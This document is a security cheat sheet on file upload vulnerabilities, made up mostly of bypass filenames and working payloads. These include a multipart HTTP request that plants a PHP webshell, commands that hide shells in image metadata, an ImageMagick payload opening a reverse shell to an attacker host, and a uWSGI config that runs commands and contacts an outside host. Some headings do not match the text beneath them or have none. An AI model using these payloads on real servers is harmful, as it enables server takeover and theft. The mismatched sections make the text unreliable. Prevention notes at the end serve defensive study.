---
title: File Upload
---

# File Upload Vulnerabilities

---

## What is a File Upload Vulnerability?

File upload vulnerabilities occur when a web server allows users to upload files to its filesystem without sufficiently validating their **`name`, `type`, `contents`,** or **`size`**. Even a basic image upload function can be used to upload arbitrary and potentially dangerous files — including server-side scripts that enable remote code execution.

---

## Attack Surface

Common application areas to look for file upload functionality:

- **Profile / avatar uploads** — Profile picture, cover photo
- **Document submissions** — Resume, KYC documents, ID proof
- **Support portals** — Ticket attachments, bug report uploads
- **Media platforms** — Image/video galleries
- **CSV / Excel import** — Data import functionality
- **CMS file managers** — Blog post media, themes, plugins
- **Archive extraction** — ZIP/TAR file processing endpoints
- **PDF / document generators** — HTML-to-PDF tools accepting file input

---

## Exploitation & Bypasses

## 1.1 Dangerous File Extensions

### PHP

`.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module`

**PHP 8 still executes:** `.php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp`

### ASP / ASPX

`.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml`

### JSP

`.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action`

### ColdFusion

`.cfm, .cfml, .cfc, .dbm`

### Other

Flash → `.swf` | Perl → `.pl, .cgi` | Yaws → `.yaws`

---

## 1.2 Bypass File Extension Filters

### 1.2.1 Case Manipulation

```
pHp, .pHP5, .PhAr
```

### 1.2.2 Double Extension

```
file.png.php
file.jpg.phtml
file.png.pHp5
```

### 1.2.3 Special Characters at End of Extension

```
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.php....
```

### 1.2.4 Null Bytes / Junk Between Extensions

```
file.png.php
file.png.pHp5
file.php#.png
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
file.phpJunk123png
file.png.jpg.php
file.php%00.png%00.jpg
```

### 1.2.5 Executable Extension Before Valid Extension

Some servers (Apache misconfig) execute any file containing `.php` even if it doesn't end in `.php`:

```
file.php.png
```

### 1.2.6 Filename Length Limit Abuse

Linux max filename = 255 bytes. If server truncates at a limit, the valid extension gets cut off, leaving the malicious extension:

```bash
# Create long filename — truncation drops ".png" leaving ".php"
AAA<232 chars>.php.png
```

**Trailing dot bypass** (UniSharp Laravel LFM — CVE-2024-21546): Upload `shell.php.` — server strips the trailing dot and saves `shell.php`.

Minimal PoC:

```
POST /profile/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="shell.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```

Then access: `GET /storage/files/shell.php?cmd=id`

---

## 1.3 Bypass Content-Type, Magic Number, Compression & Resizing

### 1.3.1 Bypass Content-Type Checks

Override the `Content-Type` header to a permitted value: `image/png`, `text/plain`, `application/octet-stream`

Wordlist: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)

### 1.3.2 Bypass Magic Number Checks

Add real image magic bytes at the start of the file to pass the `file` command check:

```bash
# Embed PHP shell in image metadata
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

# Or append directly to image
echo '<?php system($_REQUEST["cmd"]); ?>' >> img.png
```

### 1.3.3 Bypass Compression (PHP-GD)

If `PHP-GD` is used, payloads in image data are destroyed. Use the **PLTE chunk** technique to embed data that survives compression.

> Reference: `astrolock/payloads/generators/gen_plte_png.php`
> 

### 1.3.4 Bypass Image Resize

If `imagecopyresized` / `imagecopyresampled` is used, payloads in pixel data are destroyed. Use the **IDAT chunk** or **tEXt chunk** technique to survive:

> Reference: `astrolock/payloads/generators/gen_idat_png.php` / `gen_tEXt_png.php`
> 

### PHP Webshell Tag Alternatives

```php
# Classic
<?php system($_GET['cmd']); ?>

# Script tag (no <?php needed)
<script language="php">system("id");</script>

# Short echo tag
<?=$_GET[0]?>
```

---

## 1.4 Other Checks for File Upload Vulnerability

- **Rename already-uploaded files** — Find a rename function to change extension post-upload.
- **LFI chaining** — Find an LFI vulnerability to include/execute the uploaded backdoor.
- **Information disclosure via filename collision:**
    - Upload the same filename multiple times simultaneously — observe race or disclosure.
    - Upload a file named `.`, `..`, or `…` — may write a file outside the intended directory.
    - Upload with Windows reserved names: `CON, PRN, AUX, NUL, COM1–COM9, LPT1–LPT9`.
    - Upload with invalid Windows characters: `|<>*?"` in filename.
    - Upload `"...:.jpg"` in NTFS (Windows) — file may be undeletable.
- **Upload `.exe` or `.html`** — Execute when accidentally opened by victim.

> **PHP server tip:** Try the `.htaccess` trick to execute code.
**ASP/IIS server tip:** Try the `.web.config` trick to execute code.
> 

---

## Exploiting Specific Mechanisms

### Configuration File Overwrite

**`.htaccess` upload** — Forces all `.jpg` files in the upload directory to execute as PHP:

**`web.config` upload** — Forces `.jpg` files to execute as ASP on IIS:

### Race Condition Upload

Upload a malicious file and immediately request it before the server's async validation/cleanup deletes it:

**Tools:** Burp Suite Turbo Intruder, `ffuf` with parallel requests (`-rate`)

### Polyglot Files (GIFAR)

A polyglot file is simultaneously valid as two file types. It passes image validation but executes as a script if served from a PHP-enabled path:

Also works with PDF+JS, ZIP+HTML (mHTML), SVG+XML.

```
push graphic-context
viewbox 0 0 640 480
fill 'url(<https://127.0.0.1/test.jpg>"|bash -i >& /dev/tcp/attacker-ip/port 0>&1|touch "hello)'
pop graphic-context
```

Trigger: `convert shellexec.jpeg whatever.gif`

```bash
# Generate payload image
pngcrush -text a "profile" "/etc/passwd" exploit.png

# Upload and download the converted image, then inspect
identify -verbose pngconverted.png

# Convert extracted hex to text
python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'
```

### Jetty RCE via XML Upload

```
[uwsgi]
body = @(exec://whoami)
extra = @(exec://curl <http://collaborator.oastify.com>)
```

> Execution happens when uWSGI restarts or auto-reloads the config.
> 

### Gibbon LMS Unauthenticated File Write → RCE (CVE-2023-45878)

Unauthenticated endpoint allows arbitrary file write to web root. Affected: ≤ 25.0.01.

### wget URL Upload + Filename Truncation Bypass

`wget` truncates filenames to 236 chars. Craft a filename: `"A"*232 + ".php" + ".gif"` — `.gif` passes the whitelist check, `wget` saves it as `.php`:

- Name file `shell.php\x00.pdf` in ZIP local header
- Validator sees `.pdf` (allowed), extractor writes `shell.php` to disk

```bash
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf
# Hex-edit: replace first dot after ".php" with 0x00
# ZipArchive shows .pdf, filesystem writes shell.php
```

Concatenate two valid ZIP files. Validator reads the first archive (benign); extractor reads the last EOCD (malicious):

```bash
zip zip1.zip benign_file
zip zip2.zip shell.php
cat zip1.zip zip2.zip > combo.zip
# Upload combo.zip — validation may check zip1 contents only
```

## File Upload Chained to Other Vulnerabilities

| Chain | Technique |
| --- | --- |
| **Command Injection** | Filename: `; sleep 10;` |
| **SSRF** | If server fetches an image from a URL you specify, try internal IPs |
| **PDF XSS** | Specially crafted PDFs with embedded JS payload |

---

### Manual Detection

1. **Try uploading `.htaccess`** — Observe if server accepts without error.
2. **Test MIME override** — Upload `.php` but set `Content-Type: image/jpeg`; observe if accepted.
3. **Inject PHP in metadata** — `exiftool -Comment="<?php system('id'); ?>"` into an image, upload, access.
4. **Test archive extraction** — Upload ZIP containing `../shell.php`; check if file appears outside upload dir.
5. **Race conditions** — Use Turbo Intruder to rapidly access file URL immediately after upload.

---

- **Remote Code Execution (RCE)** — Upload a webshell → full server control.
- **Arbitrary File Overwrite** — Overwrite critical server files, configs, or system files.
- **Directory Traversal chaining** — Write to unintended locations (ZIP Slip).
- **Denial of Service (DoS)** — Upload extremely large files to exhaust disk space.
- **Client-side attacks (XSS/XXE)** — Malicious SVG or PDF files targeting other users who view them.
- **SSRF** — Server fetches attacker-controlled URL during image processing.

---

## Impact

- Remote Code Execution (RCE) if attackers upload and execute malicious scripts on the server.
- Server compromise leading to unauthorized access, data theft, or further exploitation.
- Web shell deployment allowing persistent access and command execution.
- Cross-Site Scripting (XSS) through malicious file uploads such as SVG, HTML, or image metadata payloads.
- Malware distribution by hosting malicious files on the application server.
- Sensitive information disclosure through access to uploaded files or misconfigured storage locations.
- Denial of Service (DoS) by uploading oversized files, resource-intensive files, or archive bombs.
- Server-side request forgery (SSRF) or other attacks through maliciously crafted files processed by backend services.
- Defacement or unauthorized modification of application content.
- Compromise of other users' data through insecure file access controls.

---

## Prevention Techniques

- Allow only required file extensions using an allowlist; reject all others by default.
- Validate the uploaded file's content using MIME type and magic byte checks rather than relying on the file extension or `Content-Type` header.
- Generate random filenames for uploaded files and avoid using user-supplied filenames.
- Store uploaded files outside the web root or in isolated storage to prevent direct access and execution.
- Configure the web server to prevent execution of uploaded files as scripts (e.g., PHP, JSP, ASPX).
- Enforce file size, file type, and upload count limits to reduce abuse and DoS risks.
- Sanitize filenames to remove special characters, null bytes, and directory traversal sequences.
- Scan uploaded files with antivirus or malware detection before processing or serving them.
- Re-encode or sanitize images, PDFs, and Office documents to remove embedded malicious content where applicable.
- Validate and securely extract archive files to prevent Zip Slip and ZIP bomb attacks.
- Restrict file upload functionality to authorized users and enforce appropriate access controls.
- Log and monitor file upload activity to detect suspicious or malicious behavior.
- Keep file processing libraries, parsers, and related components updated with the latest security patches.

---

## Tools

- **Nuclei** – Detect known file upload vulnerabilities using community and custom templates.
- **ExifTool** – Modify image metadata for metadata injection and Stored XSS testing.
- **ImageMagick** – Generate, convert, and manipulate image files for image processing tests (e.g., ImageTragick).

---

## Good To Read

- **HackerOne Hacktivity** — Search `"file upload"` or `"unrestricted file upload"`.
    - https://hackerone.com/reports/808287
    - https://hackerone.com/reports/1164452
    - https://hackerone.com/reports/949295
- **OWASP** — Unrestricted File Upload: [https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload insecure files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://book.hacktricks.wiki/en/pentesting-web/file-upload/](https://book.hacktricks.wiki/en/pentesting-web/file-upload/)